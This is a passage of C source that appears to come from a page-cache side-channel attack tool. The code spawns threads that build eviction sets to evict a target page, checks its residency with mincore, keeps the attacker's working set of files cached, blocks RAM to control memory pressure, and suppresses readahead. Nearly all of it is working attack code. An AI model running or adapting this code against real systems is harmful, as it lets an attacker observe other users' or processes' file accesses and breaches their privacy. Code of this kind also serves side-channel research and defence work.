    printf(INFO "[Eviction Set] Resident pages: %zu kB, access time: %zu us\n", already_resident * PAGE_SIZE / 1024, t_resident / 1000);
    printf(INFO "[Eviction Set] Non resident pages: %zu kB, access time: %zu us\n", (accessed_mem - already_resident * PAGE_SIZE) / 1024, t_non_resident / 1000);
#endif

    return accessed_mem;
}

#endif


int spawnESThreads(AttackEvictionSet *es, void *target_addr, size_t mincore_check_all_x_bytes)
{
    int ret = 0;
    size_t processed_pages = 0;
    size_t pages_per_thread_floor = es->mapping_.size_pages_ / es->access_thread_count_;
    pthread_attr_t thread_attr;
    cpu_set_t cpu_mask;

    pthread_attr_init(&thread_attr);

    //  reserve space for access thread data structures
    if (dynArrayResize(&es->access_threads_, es->access_thread_count_) == NULL)
    {
        printf(FAIL "Could not reserve memory...\n");
        goto error;
    }

    // prepare thread_data objects
    for (size_t t = 0; t < es->access_thread_count_ - 1; t++)
    {
        PageAccessThreadESData *thread_data = dynArrayGet(&es->access_threads_, t);
        initPageAccessThreadESData(thread_data);
        thread_data->eviction_mapping_ = &es->mapping_;
        thread_data->page_offset_ = processed_pages;
        thread_data->size_pages_ = pages_per_thread_floor;
        thread_data->target_addr_ = target_addr;
        thread_data->mincore_check_all_x_bytes_ = mincore_check_all_x_bytes;
        thread_data->start_sem_ = &es->worker_start_sem_;
        thread_data->join_sem_ = &es->worker_join_sem_;
        processed_pages += pages_per_thread_floor;
    }
    // prepare thread_data object for last thread
    PageAccessThreadESData *thread_data = dynArrayGet(&es->access_threads_, es->access_thread_count_ - 1);
    initPageAccessThreadESData(thread_data);
    thread_data->eviction_mapping_ = &es->mapping_;
    thread_data->page_offset_ = processed_pages;
    thread_data->size_pages_ = es->mapping_.size_pages_ - processed_pages;
    thread_data->target_addr_ = target_addr;
    thread_data->mincore_check_all_x_bytes_ = mincore_check_all_x_bytes;
    thread_data->start_sem_ = &es->worker_start_sem_;
    thread_data->join_sem_ = &es->worker_join_sem_;

    // spin up worker threads
    for (size_t t = 0; t < es->access_thread_count_; t++)
    {
        CPU_ZERO(&cpu_mask);
        CPU_SET(used_pus, &cpu_mask);
        pthread_attr_setaffinity_np(&thread_attr, sizeof(cpu_set_t), &cpu_mask);

        PageAccessThreadESData *thread_data = dynArrayGet(&es->access_threads_, t);
        if (pthread_create(&thread_data->tid_, &thread_attr, pageAccessThreadES, thread_data) != 0)
        {
            printf(FAIL "Error (%s) at creating ES access thread...\n", strerror(errno));
            goto error;
        }

        // increase to next core if wanted
        if ((t + 1) % es->access_threads_per_pu_ == 0)
        {
            // NOTE has to be locked when accessed concourrently in future
            used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
        }
    }

    goto cleanup;

error:
    ret = -1;
    dynArrayDestroy(&es->access_threads_, closePageAccessThreadESData);

cleanup:
    pthread_attr_destroy(&thread_attr);

    return ret;
}


void *pageAccessThreadES(void *arg)
{
    PageAccessThreadESData *page_thread_data = arg;
    size_t accessed_mem = 0;
    unsigned char target_page_status = 0;
    volatile uint8_t tmp = 0;
    (void)tmp;

    printf(INFO ES_THREAD_TAG "Worker thread (page offset: %zu, max. page count: %zu) running on core %d.\n",
           page_thread_data->page_offset_, page_thread_data->size_pages_, sched_getcpu());
    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
    {
        if (sem_wait(page_thread_data->start_sem_) != 0)
        {
            printf(FAIL ES_THREAD_TAG "Error (%s) at sem_wait (%p)...\n", strerror(errno), (void *)page_thread_data->start_sem_);
            goto error;
        }

        accessed_mem = 0;
        for (size_t p = page_thread_data->page_offset_;
             p < page_thread_data->page_offset_ + page_thread_data->size_pages_;
             p++)
        {
            if (accessed_mem % page_thread_data->mincore_check_all_x_bytes_ == 0)
            {
                // check if target page was evicted
                if (mincore(page_thread_data->target_addr_, PAGE_SIZE, &target_page_status) < 0)
                {
                    // in case of error just print warnings and access whole ES
                    printf(FAIL ES_THREAD_TAG "Error (%s) at mincore...\n", strerror(errno));
                }
                else if (!(target_page_status & 1))
                {
                    break;
                }
            }

#ifdef ES_USE_PREAD
            if (pread(page_thread_data->eviction_mapping_->fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
            {
                // in case of error just print warnings and access whole ES
                printf(WARNING ES_THREAD_TAG "Error (%s) at pread...\n", strerror(errno));
            }
#ifdef PREAD_TWO_TIMES
            if (pread(page_thread_data->eviction_mapping_->fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
            {
                // in case of error just print warnings and access whole ES
                printf(WARNING ES_THREAD_TAG "Error (%s) at pread...\n", strerror(errno));
            }
#endif
#else
            tmp = *((uint8_t *)page_thread_data->eviction_mapping_->addr_ + p * PAGE_SIZE);
#endif
            accessed_mem += PAGE_SIZE;
        }

        DEBUG_PRINT((DEBUG ES_THREAD_TAG "Worker thread (page offset: %zu, max. page count: %zu) accessed %zu kB.\n",
                     page_thread_data->page_offset_, page_thread_data->size_pages_, accessed_mem / 1024));
        page_thread_data->accessed_mem_ = accessed_mem;
        if (sem_post(page_thread_data->join_sem_) != 0)
        {
            printf(FAIL ES_THREAD_TAG "Error (%s) at sem_post (%p)...\n", strerror(errno), (void *)page_thread_data->join_sem_);
            goto error;
        }
    }

    return NULL;

error:

    return (void *)-1;
}


void *bsManagerThread(void *arg)
{
    AttackBlockingSet *bs = arg;
    size_t available_mem = 0;
    size_t mem_diff = 0;
    // set goal for available mem in middle of allowed region
    size_t available_mem_goal = bs->min_available_mem_ + (bs->max_available_mem_ - bs->min_available_mem_) / 2;

    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
    {
        DEBUG_PRINT((DEBUG BS_MGR_TAG "BS manager thread running on core %d.\n", sched_getcpu()));
        available_mem = parseAvailableMem(bs->meminfo_file_path_) * 1024;
        DEBUG_PRINT((DEBUG BS_MGR_TAG "%zu kB of physical memory available\n", available_mem / 1024));
        //printf(DEBUG BS_MGR_TAG "%zu kB of physical memory available\n", available_mem / 1024);

        if (available_mem < bs->min_available_mem_)
        {
            mem_diff = available_mem_goal - available_mem;
            printf(INFO BS_MGR_TAG "Too less physical memory available, trying to release %zu kB...\n", mem_diff / 1024);
            releaseRAM(bs, mem_diff);
        }
        else if (available_mem > bs->max_available_mem_)
        {
            // * 3 / 4 for slower convergence (less overshoot)
            mem_diff = (available_mem - available_mem_goal) * 3 / 4;
            // blocking rounds down, only down when at least as big as one unit
            if(mem_diff >= bs->def_fillup_size_)
            {
                printf(INFO BS_MGR_TAG "Too much physical memory available, trying to block %zu kB...\n", mem_diff / 1024);
                blockRAM(bs, mem_diff);
            }
        }
        else if (!bs->initialized_)
        {
            sem_post(&bs->initialized_sem_);
            bs->initialized_ = 1;
        }

        nanosleep(&bs->evaluation_sleep_time_, NULL);
    }

    return NULL;
}


size_t parseAvailableMem(char *meminfo_file_path)
{
    FILE *meminfo_file = NULL;
    char line[LINE_MAX] = {0};
    char *available_mem_str = NULL;
    char *conversion_end = NULL;
    // in case of error SIZE_T_MAX is reported as available memory to trigger no action
    size_t available_mem = (size_t)-1;

    // open meminfo file
    meminfo_file = fopen(meminfo_file_path, "r");
    if (!meminfo_file)
    {
        printf(WARNING BS_MGR_TAG "Available memory could not be parsed!\n");
        printf(WARNING BS_MGR_TAG "Returning SIZE_MAX!\n");
        return available_mem;
    }

    // canary to see if line was longer as buffer
    line[IN_LINE_MAX - 1] = 'c';
    while (fgets(line, IN_LINE_MAX, meminfo_file))
    {
        // skip lines longer than 255
        if (line[IN_LINE_MAX - 1] == '\0')
        {
            continue;
        }

        if (strstr(line, MEMINFO_AVAILABLE_MEM_TAG) != NULL)
        {
            for (size_t c = strlen(MEMINFO_AVAILABLE_MEM_TAG); line[c] != 0; c++)
            {
                if (isdigit(line[c]))
                {
                    if (available_mem_str == NULL)
                    {
                        available_mem_str = line + c;
                    }
                }
                else if (available_mem_str != NULL)
                {
                    line[c] = 0;
                    break;
                }
            }

            available_mem = strtoul(available_mem_str, &conversion_end, 10);
            if ((available_mem_str != NULL && *available_mem_str == 0) || *conversion_end != 0 || errno == ERANGE)
            {
                available_mem_str = NULL;
                break;
            }

            break;
        }
    }

    if (!available_mem_str)
    {
        printf(WARNING BS_MGR_TAG "Available memory could not be parsed!\n");
        printf(WARNING BS_MGR_TAG "Returning SIZE_MAX!\n");
    }

    fclose(meminfo_file);

    return available_mem;
}


// TODO Maybe update profile after certain amount of time.
void *wsManagerThread(void *arg)
{
    AttackWorkingSet *ws = arg;
    size_t runs_since_last_profile_update = 0;
    void *ret = NULL;
    cpu_set_t cpu_mask;
    List tmp_list_swap1;
    List tmp_list_swap2;
    size_t tmp_size_t;

    // if access thread count is zero, stop operation as senseless
    if (ws->access_thread_count_ == 0)
    {
        return NULL;
    }

    //  reserve space for access thread data structures
    if (dynArrayResize(&ws->access_threads_, ws->access_thread_count_) == NULL)
    {
        printf(FAIL WS_MGR_TAG "Could not reserve memory...\n");
        goto error;
    }
    for (size_t t = 0; t < ws->access_thread_count_; t++)
    {
        // initialise access thread data structures
        initPageAccessThreadWSData(dynArrayGet(&ws->access_threads_, t));
    }
    // split up resident files into worker thread units
    preparePageAccessThreadWSData(ws);

    // spin up worker threads
    for (size_t t = 0; t < ws->access_thread_count_; t++)
    {
        PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);

        // used to spin up worker threads on different CPUs
        pthread_attr_init(&thread_data->thread_attr_);

        CPU_ZERO(&cpu_mask);
        CPU_SET(used_pus, &cpu_mask);
        pthread_attr_setaffinity_np(&thread_data->thread_attr_, sizeof(cpu_set_t), &cpu_mask);

        printf(INFO WS_MGR_TAG "Thread %zu configured to run on core %d and to access %zu files.\n", t, used_pus, thread_data->resident_files_.count_);
        thread_data->running_ = 1;
        if (pthread_create(&thread_data->tid_, &thread_data->thread_attr_, pageAccessThreadWS, thread_data) != 0)
        {
            printf(FAIL WS_MGR_TAG "Error (%s) at creating WS access thread...\n", strerror(errno));
            goto error;
        }

        // increase to next core if wanted
        if ((t + 1) % ws->access_threads_per_pu_ == 0)
        {
            // NOTE has to be locked when accessed concourrently in future
            used_pus = (used_pus + PU_INCREASE < MAX_PUS) ? used_pus + PU_INCREASE : used_pus;
        }
    }

    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
    {
        DEBUG_PRINT((DEBUG WS_MGR_TAG "WS manager thread running on core %d.\n", sched_getcpu()));

        // update ws profile
        if (runs_since_last_profile_update == ws->profile_update_all_x_evaluations_)
        {
            DEBUG_PRINT((DEBUG WS_MGR_TAG "Launching profile update - not implemented.\n"));
            // TODO
            // make new profile
            // split up into thread portions
            // spin up thread with new profile
            runs_since_last_profile_update = 0;
        }

        // reevaluate working set
        DEBUG_PRINT((DEBUG WS_MGR_TAG "Reevaluating working set...\n"));
        // reevaluateWorkingSet fails if eviction was run during the reevaluation
        // in case of an error the original (current) lists are not changed
        if (ws->evaluation_ && reevaluateWorkingSet(ws) == 0)
        {
            DEBUG_PRINT((WS_MGR_TAG "Rescanned working set now consists of %zu files (%zu bytes mapped).\n", ws->tmp_resident_files_.count_, ws->tmp_mem_in_ws_));

	     // TODO change to one lock
            // acquire locks
            for (size_t t = 0; t < ws->access_thread_count_; t++)
            {
                PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);

                if (thread_data->running_)
                {
                    pthread_mutex_lock(&thread_data->resident_files_lock_);
                }
            }

            // swap lists
            tmp_list_swap1 = ws->resident_files_;
            tmp_list_swap2 = ws->non_resident_files_;
            ws->resident_files_ = ws->tmp_resident_files_;
            ws->non_resident_files_ = ws->tmp_non_resident_files_;
            ws->tmp_resident_files_ = tmp_list_swap1;
            ws->tmp_non_resident_files_ = tmp_list_swap2;

            tmp_size_t = ws->mem_in_ws_;
            ws->mem_in_ws_ = ws->tmp_mem_in_ws_;
            ws->tmp_mem_in_ws_ = tmp_size_t;

            // rebalance files for threads
            preparePageAccessThreadWSData(ws);

            // release locks
            for (size_t t = 0; t < ws->access_thread_count_; t++)
            {
                PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);

                if (thread_data->running_)
                {
                    pthread_mutex_unlock(&thread_data->resident_files_lock_);
                }
            }
        }

        runs_since_last_profile_update++;
        nanosleep(&ws->evaluation_sleep_time_, NULL);
    }

    goto cleanup;

error:
    ret = (void *)-1;

cleanup:
    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadWSData);

    return ret;
}


void preparePageAccessThreadWSData(AttackWorkingSet *ws)
{
    ListNode *current_head = NULL;
    size_t files_per_thread_floor = 0;
    size_t processed_files = 0;
    size_t t = 0;

    if (ws->resident_files_.count_ == 0)
    {
        return;
    }

    // current head
    current_head = ws->resident_files_.head_;
    // pages per thread (rounded down)
    files_per_thread_floor = ws->resident_files_.count_ / ws->access_thread_count_;
    // prepare thread_data objects
    for (t = 0; t < ws->access_thread_count_ - 1; t++)
    {
        PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);
        // prepare fake lists
        thread_data->sleep_time_ = ws->access_sleep_time_;
        thread_data->resident_files_.head_ = current_head;
        thread_data->resident_files_.count_ = files_per_thread_floor;

        processed_files += files_per_thread_floor;
        current_head = listGetIndex(&ws->resident_files_, processed_files);
    }
    // prepare thread_data object for last thread
    PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);
    thread_data->sleep_time_ = ws->access_sleep_time_;
    thread_data->resident_files_.head_ = current_head;
    thread_data->resident_files_.count_ = ws->resident_files_.count_ - processed_files;

    return;
}


int reevaluateWorkingSet(AttackWorkingSet *ws)
{
    // ensure the tmp variables are empty
    listDestroy(&ws->tmp_resident_files_, closeCachedFileArrayFreeOnly);
    listDestroy(&ws->tmp_non_resident_files_, closeCachedFileArrayFreeOnly);
    ws->tmp_mem_in_ws_ = 0;

    // reevaluate resident files list
    // in case of an error the original lists are not changed
    if (reevaluateWorkingSetList(&ws->resident_files_, ws) < 0)
    {
        return -1;
    }
    // reevaluate non resident files list
    // in case of an error the original lists are not changed
    if (reevaluateWorkingSetList(&ws->non_resident_files_, ws) < 0)
    {
        return -1;
    }

    return 0;
}


int reevaluateWorkingSetList(List *cached_file_list, AttackWorkingSet *ws)
{
    ListNode *current_cached_file_node = NULL;
    ListNode *next_node = NULL;
    CachedFile current_cached_file = {0};

    // go cached files list
    current_cached_file_node = cached_file_list->head_;
    while (current_cached_file_node != NULL)
    {
        next_node = current_cached_file_node->next_;

        // copy current cached file and create a new dynarray
        // the copy ensures that the current state is not changed but kept
        current_cached_file = *((CachedFile *)current_cached_file_node->data_);
        if (!dynArrayInit(&current_cached_file.resident_page_sequences_, sizeof(PageSequence), ARRAY_INIT_CAP))
        {
            printf(FAIL "Error at dynArrayInit...\n");
            goto error;
        }

        // reevaluate file
        if (profileResidentPageSequences(&current_cached_file, ws->ps_add_threshold_) < 0)
        {
            printf(FAIL "Error at profileResidentPageSequences...\n");
            goto error;
        }

        // eviction is running stop
        if (ws->eviction_ignore_evaluation_ && __atomic_load_n(&eviction_running, __ATOMIC_RELAXED) == 1)
        {
            DEBUG_PRINT((DEBUG "Eviction occured during reevaluation, ignoring result...\n"));
            goto error;
        }

        // move to file to tmp non resident file list
        if (current_cached_file.resident_memory_ == 0)
        {
            listAppendBack(&ws->tmp_non_resident_files_, &current_cached_file);
        }
        else
        {
            listAppendBack(&ws->tmp_resident_files_, &current_cached_file);
            ws->tmp_mem_in_ws_ += current_cached_file.resident_memory_;
        }

        current_cached_file_node = next_node;
    }

    return 0;

error:

    dynArrayDestroy(&current_cached_file.resident_page_sequences_, NULL);
    return -1;
}


void *pageAccessThreadWS(void *arg)
{
    PageAccessThreadWSData *page_thread_data = arg;
    volatile uint8_t tmp = 0;
    ListNode *resident_files_node = NULL;
    CachedFile *current_cached_file = NULL;
    PageSequence *resident_sequences = NULL;
    size_t resident_sequences_length = 0;
    size_t accessed_pages_count = 0;
    size_t accessed_files_count = 0;
    (void)tmp;

    while (__atomic_load_n(&page_thread_data->running_, __ATOMIC_RELAXED))
    {
        DEBUG_PRINT((DEBUG WS_MGR_TAG "Worker thread (PSL: %p) running on core %d.\n", (void *)page_thread_data->resident_files_.head_, sched_getcpu()));

        pthread_mutex_lock(&page_thread_data->resident_files_lock_);

        accessed_files_count = 0;
        accessed_pages_count = 0;
        resident_files_node = page_thread_data->resident_files_.head_;
        while (resident_files_node != NULL && accessed_files_count < page_thread_data->resident_files_.count_)
        {
            current_cached_file = (CachedFile *)resident_files_node->data_;

// TODO considering removing if has impact on time
#ifdef WS_MAP_FILE
            // advise random access to avoid readahead
            madvise(current_cached_file->addr_, current_cached_file->size_, MADV_RANDOM);
#else
            // advise random access to avoid readahead
            posix_fadvise(current_cached_file->fd_, 0, 0, POSIX_FADV_RANDOM);
#endif

            resident_sequences = current_cached_file->resident_page_sequences_.data_;
            resident_sequences_length = current_cached_file->resident_page_sequences_.size_;

            for (size_t s = 0; s < resident_sequences_length; s++)
            {
                for (size_t p = resident_sequences[s].offset_; p < resident_sequences[s].offset_ + resident_sequences[s].length_; p++)
                {
                    //printf("Accessing offset %zu, %zu length\n", resident_sequences[s].offset_, resident_sequences[s].length_);
#ifdef WS_MAP_FILE
                    tmp = *((uint8_t *)current_cached_file->addr_ + p * PAGE_SIZE);
#else
                    if (pread(current_cached_file->fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
                    {
                        printf(WARNING WS_MGR_TAG "Error (%s) at pread...\n", strerror(errno));
                    }
#ifdef PREAD_TWO_TIMES
                    if (pread(current_cached_file->fd_, (void *)&tmp, 1, p * PAGE_SIZE) != 1)
                    {
                        printf(WARNING WS_MGR_TAG "Error (%s) at pread...\n", strerror(errno));
                    }
#endif
#endif
                    accessed_pages_count++;
                }
            }

            accessed_files_count++;
            resident_files_node = resident_files_node->next_;
        }

        DEBUG_PRINT((DEBUG WS_MGR_TAG "Worker thread (PSL: %p) accessed %zu kB memory.\n", (void *)page_thread_data->resident_files_.head_, accessed_pages_count * PAGE_SIZE / 1024));

        pthread_mutex_unlock(&page_thread_data->resident_files_lock_);

        // TODO consider applying high(er) pressure in times of running eviction
#ifdef USE_NANOSLEEP
        nanosleep(&page_thread_data->sleep_time_, NULL);
#else
        sched_yield();
#endif
    }

    return NULL;
}


int spawnSuppressThreads(Attack *attack, pthread_attr_t *thread_attr)
{
    // readahead surpressing threads for target
    for (size_t t = 0; t < attack->ss_thread_count_; t++)
    {
        pthread_t tid;

        // by default run on a different core if possible
        if (pthread_create(&tid, thread_attr, suppressThread, (void *)&attack->suppress_set_) != 0)
        {
            printf(FAIL "Error (%s) at pthread_create...\n", strerror(errno));
            return -1;
        }
        if (!dynArrayAppend(&attack->ss_threads_, &tid))
        {
            printf(FAIL "Error at dynArrayAppend...\n");
            return -1;
        }
    }

    return 0;
}


void *suppressThread(void *arg)
{
    AttackSuppressSet *ss = arg;
    volatile uint8_t tmp = 0;
    uint8_t **pages = ss->target_readahead_window_.data_;

    while (__atomic_load_n(&running, __ATOMIC_RELAXED))
    {
        for (size_t p = 0; p < ss->target_readahead_window_.size_; p++)
        {
            tmp += *pages[p];
        }

#ifdef USE_NANOSLEEP
        nanosleep(&ss->access_sleep_time_, NULL);
#else
        sched_yield();
#endif
    }

    return NULL;
}


size_t getMappingCount(const unsigned char *status, size_t size_in_pages)
{
    size_t mapped = 0;

    for (size_t p = 0; p < size_in_pages; p++)
    {
        mapped += (status[p] & 1);
    }

    return mapped;
}


void usageError(char *app_name)
{
    printf(USAGE USAGE_MSG, app_name);
}
